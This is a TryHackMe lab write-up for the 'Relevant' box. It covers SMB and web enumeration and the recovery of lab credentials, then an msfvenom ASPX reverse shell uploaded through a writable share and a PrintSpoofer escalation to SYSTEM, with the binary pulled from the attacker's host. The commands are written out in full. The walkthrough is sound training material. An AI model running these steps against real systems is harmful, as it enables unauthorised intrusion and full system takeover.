# Relevant: TryHackMe Writeup

## Box Information

```jsx
Penetration Testing Lab
```

- Fair enough

**Target:** relevant.thm

---

# Part 1: Enumeration

## Nmap Scanning

### What is Nmap?

**Nmap (Network Mapper)** is one of the most commonly used reconnaissance tools in penetration testing. It is used to discover hosts, identify open ports, detect running services, and gather information about a target before attempting exploitation.

Rather than immediately looking for vulnerabilities, the first goal is simply to answer one question:

> **"What services is this machine exposing to the network?"**
> 

We begin by performing a full port scan to identify all exposed services on the target:

```
nmap -T4 -p- relevant.thm -Pn -v
```

### Command Breakdown

- **`T4`** – Speeds up the scan while remaining reliable on most networks.
- **`p-`** – Scans all **65,535 TCP ports** instead of only the default top 1,000.
- **`Pn`** – Assumes the target is online instead of relying on ICMP (ping), which is often blocked by firewalls.
- **`v`** – Displays verbose output so progress can be monitored during the scan.

<img width="1400" alt="r01" src="image/r01.png">

After discovering the open ports, I performed a second scan to identify service versions and gather additional information.

```
nmap -p 80,135,139,445,3389,49663,49666,49667 relevant.thm -A -v
```

### Why perform another scan?

The first scan only tells us **which ports are open**.

The second scan answers more important questions:

- What application is running?
- Which version is it?
- What operating system is this machine using?
- Are there any useful scripts or banners available?

This information helps narrow down possible attack vectors.

```jsx
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server

135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds

3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-14T17:13:50
| Not valid after:  2026-03-16T17:13:50
| MD5:   c985:2c68:81a2:cdfa:d1de:7052:1903:460b
|_SHA-1: 6ff6:036a:226b:6375:51c3:47ce:bee0:d97b:87e5:ce5c
|_ssl-date: 2025-09-15T17:19:47+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2025-09-15T17:19:07+00:00

49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc       
```

### Key Findings

- **Port 80 / 49663** → Microsoft IIS 10.0 (Web Server)
- **Ports 135, 139, 445** → SMB services
- **Port 3389** → RDP (Remote Desktop)
- **High RPC Ports** → Additional Windows services

Add the hostname to your `/etc/hosts` file for easier access:

```
<target_ip> relevant.thm
```

## HTTP Enumeration (Port 80)

Visiting the web server reveals a default IIS page:

!image.png

 Attempted directory brute forcing using **Gobuster**

### What is Gobuster?

Gobuster is a directory and file brute-forcing tool.

Instead of manually guessing URLs, Gobuster automatically requests hundreds or thousands of common directory and file names to discover content that may not be linked on the website.

### Command Breakdown

- **`dir`** – Performs directory enumeration.
- **`u`** – Specifies the target URL.
- **`w`** – Wordlist used during brute forcing.
- **`x`** – Searches for files with the listed extensions.
- **`t 50`** – Uses 50 concurrent threads to speed up the scan.

```
gobuster dir -u http://relevant.thm/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
```

No useful directories are discovered. This suggests the web server is likely not the primary attack vector.

---

## SMB Enumeration (Ports 135, 139, 445)

### Step 1: List Shares

To list shares, I will use a tool named **smbclient**

**`smbclient`** is a command-line tool included with the **Samba** suite that allows Linux systems to communicate with Windows **SMB (Server Message Block)** shares. It functions similarly to an FTP client, allowing you to connect to remote file shares, browse directories, upload and download files, and test access permissions.

During penetration testing, `smbclient` is commonly used to:

- List available SMB shares
- Connect to accessible shares
- Download or upload files
- Verify whether authentication is required
- Test user permissions with valid credentials

```
smbclient -L //relevant.thm
```

!image.png

Here, we see a listing of common shares, but there is one specific share that is very unusual named `nt4wrksv` 

Before going deeper into this share, let’s dive deeper into all of the shares that are available using `enum4linux`

### Step 2: Deeper Enumeration

**`enum4linux`** is a Linux enumeration tool designed to gather information from Windows systems through the SMB protocol. It automates several common reconnaissance tasks by combining multiple Samba utilities into a single tool, making it useful for quickly collecting information during the enumeration phase.

It can be used to identify:

- User accounts
- Groups
- Shared folders
- Password policies
- Operating system information
- Domain information
- SMB configuration details

```
enum4linux -a relevant.thm
```

!image.png

The enumeration produced very little useful information.

This is expected because **enum4linux relies heavily on SMBv1 and anonymous (null session) access**.

Modern versions of Windows disable both of these features by default for security reasons, significantly limiting what the tool can retrieve.

Rather than continuing to rely on `enum4linux`, I moved on to interacting directly with the discovered SMB share.

## Attempting Anonymous Access

Since the `nt4wrksv` share had already been identified, the next step was determining whether it allowed anonymous access.

```
smbclient //relevant.thm/nt4wrksv -N
```

### Command Breakdown

- **`N`** tells `smbclient` not to prompt for a password and instead attempt an anonymous connection.

!image.png

The connection succeeded, allowing access to the share without authentication.

This was an important discovery because anonymous SMB shares are uncommon in secure environments and often expose sensitive information.

---

## Discovering Credentials

Inside the share was a file named:

```
passwords.txt
```

I downloaded the file using:

```
get passwords.txt
```

After opening the file, the contents appeared to be Base64 encoded rather than plain text.

!image.png

To verify this, I decoded both strings:

```
echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d

echo 'QmlsbCAtIEp1bzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d
```

!image.png

The decoded output revealed valid credentials:

```
Bob  - !P@$$W0rD!123

Bill - Juo4nnaM4n420696969!$$$
```

### Analysis

Although Base64 may appear encrypted, it is actually **just an encoding format**. Anyone with access to the encoded strings can decode them almost instantly.

Finding valid usernames and passwords significantly changes the direction of the assessment.

Instead of relying on anonymous access, the next phase is determining:

- Which services accept these credentials.
- What permissions each user has.
- Whether either account can be leveraged to gain initial access.

At this point, enumeration is complete, and the engagement moves into credential validation and initial access

---

# Part 2: Initial Access

After completing enumeration, the next objective was determining whether the discovered credentials could be used to access additional services. Simply finding usernames and passwords does not guarantee they are valid or have useful permissions. The goal during this phase is to validate the credentials, identify what they can access, and determine whether they can be leveraged to obtain a shell on the target system.

## Testing SMB Access with the Discovered Credentials

The first step was verifying whether the credentials could authenticate to the SMB service.

### Bob's Account

```
smbclient -L //relevant.thm -U Bob
```

### Why test SMB first?

Since the credentials were discovered inside an SMB share, it made sense to first check whether they were valid for the SMB service itself.

Rather than immediately attempting exploitation, it's always good practice to verify:

- The credentials are valid.
- The account isn't disabled.
- The account has access to additional shares.

The `-L` option lists all available shares after authenticating as the specified user.

!image.png

Bob successfully authenticated to the SMB service.

This confirmed that:

- The credentials were valid.
- The account was active.
- Further SMB enumeration could now be performed as an authenticated user.

The same process was done for the Bill account 

## Testing Remote Desktop (RDP)

The Nmap scan identified **Remote Desktop Protocol (RDP)** running on port **3389**.

Since valid credentials had already been recovered, the next logical step was attempting to log in remotely.

```
xfreerdp /v:relevant.thm /u:Bob /p:'!P@$$W0rD!123'
```

### Command Breakdown

- `/v:` Target machine
- `/u:` Username
- `/p:` Password

!image.png

Authentication succeeded, but the connection was denied, meaning that this specific account doesn’t have the Allow log on through Remote Desktop Services” rule enabled 

The same test was performed using Bill's credentials.

```
xfreerdp /v:relevant.thm /u:Bill /p:'Juo4nnaM4n420696969!$$$'
```

!image.png

The login failed.

Since neither account could provide an RDP session, another method of leveraging the credentials was needed.

## Attempting Password Modification with RPCClient

Since Bob could authenticate successfully, I wanted to determine whether his account possessed any administrative privileges through Windows Remote Procedure Calls (RPC).

### What is rpcclient?

`rpcclient` is a Samba utility that communicates directly with Windows RPC services.

It allows administrators to perform tasks such as:

- User enumeration
- Group enumeration
- Password changes
- Domain information gathering
- Account management

If a user has sufficient privileges, it can even modify another user's account.

```
rpcclient -U "Bob" relevant.thm
```

Once connected, I attempted to reset Bill's password.

```
setuserinfo2 Bill 23 "NewPassw0rd!"
```

!image.png

The password change failed.

This likely confirms Bob is a **standard user** and doesn’t possess administrative rights over other domain or local accounts

As another method of changing Bill's password, I tested the Samba password utility.

`smbpasswd` is a Samba utility used to manage SMB account passwords.

```jsx
smbpasswd -r relevant.thm -U Bill
```

!image.png

The password couldn’t be changed 

Since Bob’s credentials are valid, I will be using a tool named `smbmap` ,which is an enumeration tool that displays permissions for SMB shares after authenticating, to see what rights this account has over the smb share

```jsx
smbmap -H relevant.thm -u Bob -p '!P@$$W0rD!123'
```

!image.png

SMBMap showed that Bob has **Read** and **Write** permissions on the **nt4wrksv** share.

Now that we know that I know I can successfully use Bob’s credentials to go into the SMB shares and can write to the share **nt4wrksv,** I could try uploading a file that would give me Remote Code Execution (RCE) over the system

During the initial Nmap scan, IIS was discovered running on **port 49663**.

This raised an important possibility that the SMB share could be mapped directly to the IIS web root.

First, I will test a harmless .txt file:

```jsx
echo "hello test" > test.txt
```

Now to go into the SMB share using `smbclient` and to transfer that txt file to the **nt4wrksv** share

```jsx
smbclient //relevant.thm/nt4wrksv -U Bob
put test.txt
ls

```

!image.png

The upload was successful

Now, to confirm that this is linked to IIS, I can use the web browser:

```jsx
 http://relevant.thm/nt4wrksv/passwords.txt:49663
```

!image.png

- I used the passwords.txt file to confirm because my file would not appear on the web for some reason

This confirmed an extremely important finding:

- The **nt4wrksv** SMB share was directly mapped to the IIS web server running on **port 49663**.

This meant that **anything uploaded to the share could also be executed through the web server**, making it an ideal location for a web shell

# Gaining Initial Access

With the attack path confirmed, the next step was generating a malicious ASPX web shell.

### 1. Generating the Payload

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=tun0 lport=4444 -f aspx > shell.aspx
```

### What is MSFVenom?

`msfvenom` is part of the Metasploit Framework and is used to generate payloads in many different formats.

For this target:

- `windows/x64/shell_reverse_tcp` creates a Windows reverse shell.
- `lhost=tun0` tells the victim where to connect back.
- `lport=4444` specifies the listening port.
- `f aspx` generates an ASP.NET page compatible with IIS.

Because the target is running Microsoft IIS, an **ASPX payload** is the appropriate choice.

!image.png

### 2. Uploading the Payload

```
smbclient //relevant.thm/nt4wrksv -U Bob

put shell.aspx

exit
```

!image.png

### 3. Starting the Listener

Before executing the payload, a Netcat listener must be waiting for the incoming connection.

```
nc -lvnp 4444
```

### What is Netcat?

Netcat is a networking utility commonly used to:

- Listen for incoming connections
- Transfer files
- Troubleshoot network communication
- Receive reverse shells

The listener must be started **before** triggering the payload; otherwise, the victim will attempt to connect and receive no response.

### 4. Triggering the Payload

Finally, I navigated to:

```
http://relevant.thm:49663/nt4wrksv/shell.aspx
```

!image.png

Now that I have access, I can locate the user flag

```jsx
where /r C:\ user.txt
```

---

# Part 3: Privilege Escalation

## Enumerating User Privileges

Before attempting privilege escalation, it's important to understand what permissions the compromised account already has.

The quickest way to do this is with:

```
whoami /priv
```

!image.png

One privilege immediately stood out:

```
SeImpersonatePrivilege
```

`SeImpersonatePrivilege` allows a process to impersonate the security token of another user after authentication.

Although legitimate software uses this privilege regularly, attackers can abuse it to impersonate higher-privileged tokens and execute commands as **NT AUTHORITY\SYSTEM**.

Because this privilege was enabled, it immediately became the primary privilege escalation vector.

There are several well-known exploits that abuse `SeImpersonatePrivilege`, including:

- Juicy Potato
- Rogue Potato
- PrintSpoofer

For this machine, **PrintSpoofer** is a reliable choice because it was specifically designed to exploit `SeImpersonatePrivilege` on modern versions of Windows.

Instead of exploiting a software vulnerability, PrintSpoofer abuses how Windows services authenticate and impersonate security tokens.

## Exploitation

Since the binary was not already available on the target machine, I first downloaded it on my Kali system.

```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe
```

!image.png

The target machine needs a way to retrieve the executable.

Instead of setting up an HTTP server, I created a temporary SMB share using Impacket.

```
impacket-smbserver share $(pwd)
```

### What is Impacket SMB Server?

`impacket-smbserver` is part of the **Impacket** toolkit.

It quickly creates an SMB file share directly from the current directory, allowing Windows machines to copy files from the attacker's system.

!image.png

With the SMB server running, I copied the executable from Kali to the compromised Windows machine.

```
copy \\10.6.46.188\share\PrintSpoofer.exe C:\Windows\Temp\PrintSpoofer.exe
```

### Why use `C:\Windows\Temp`?

The Windows Temp directory is commonly writable by standard users, making it a convenient location for temporary tools during post-exploitation.

!image.png

Once the executable had been copied successfully, I launched it.

```
C:\Windows\Temp\PrintSpoofer.exe -i -c cmd
```

### Command Breakdown

- **`i`** – Starts an interactive session.
- **`c cmd`** – Executes a new Command Prompt after privilege escalation.

!image.png

The exploit successfully abused `SeImpersonatePrivilege` and spawned a new Command Prompt running as:

```
NT AUTHORITY\SYSTEM
```

- `NT AUTHORITY\SYSTEM` is the highest privilege level on a Windows machine.

Now to retrieve the root flag:

```jsx
where /r C:\ root.txt
```
